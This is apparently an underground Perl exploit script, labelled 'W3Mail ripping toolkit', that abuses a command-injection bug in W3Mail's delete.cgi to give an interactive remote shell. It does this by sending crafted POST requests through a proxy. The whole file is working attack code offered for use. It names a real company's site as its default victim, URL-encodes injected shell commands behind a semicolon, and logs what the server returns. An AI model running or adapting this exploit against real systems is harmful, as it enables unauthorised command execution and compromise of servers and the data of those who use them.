#!/usr/bin/perl

#     defaced staff private warez
#    W3Mail ripping toolkit v 1.0.9_full
#      < w3mail-shell.pl - shell >
#
# this ware allows to exec commands via bug in W3mail
#

# CONFIG

# victim host
$host = "www.microsoft.com";
# proxy IP
$proxy_host = "1.1.1.1"; # change me, dumb ass
# proxy PORT
$proxy_port = 8080;
# path to delete.cgi
$path = "/cgi-bin/w3mail/delete.cgi";
# END OF CONFIG

use Socket;

mkdir("shell_logs");
chdir("shell_logs");

print " -== W3Mail remote shell ==-\n";

$query = "user=..\\&pass=1\\&isLogin=3\\&SessionID=66\\&servname=..\\";
$query .= "&folder=..\\&msgnum=\x253B";

$header = "POST http://${host}${path} HTTP/1.1\r\n";
$header .= "Host: ${host}\r\n";
$header .= "Connection: close\r\n";
$header .= "Content-Type: application/x-www-form-urlencoded\r\n";

open(LOGF, ">>$host");

while (1)
{
  print "\x24 ";
  $cmd = <>;
  chomp $cmd;
  print LOGF "\x24 $cmd\n";

  if ($cmd eq "quit" || $cmd eq "exit")
  {
    close(LOGF);
    exit;
  }

  socket(CON, AF_INET, SOCK_STREAM, 0);

  if (!connect(CON, sockaddr_in($proxy_port, inet_aton($proxy_host))))
  {
    print "[-] proxy error\n";
    close(LOGF);
    exit;
  }

  send(CON, $header, 0);

  $cmd = "echo 89z661a231;".$cmd."; echo 7a65he5a13;";
  $cmd =~ s/\x2f/\x25\x32\x66/g; # code '/'
  $cmd =~ s/\x20/\x25\x32\x30/g; # code ' '
  $cmd =~ s/\x26/\x25\x32\x36/g; # code '&'
  $cmd =~ s/\x3c/\x25\x33\x63/g; # code '<'
  $cmd =~ s/\x3e/\x25\x33\x65/g; # code '>'
  $cmd =~ s/\x3b/\x25\x33\x62/g; # code ';'

  $str = "${query}$cmd\x2500";
  send(CON, "Content-Length: ".length($str)."\r\n\r\n",0);
  send(CON, $str, 0);

  do { @page = <CON>; } while(<CON>);
  close(CON);

  $t = 0;
  for ($i = 1; $i < $#page; $i++)
  {
    $line = $page[$i];
    chomp $line;

    if ($t == 1 && $line =~ m/7a65he5a13/){ $t = 0;}
    if ($t == 1){ print "$line\n"; print LOGF "$line\n"; }
    if ($t == 0 && $line =~ m/89z661a231/){ $t = 1;}
  }
}
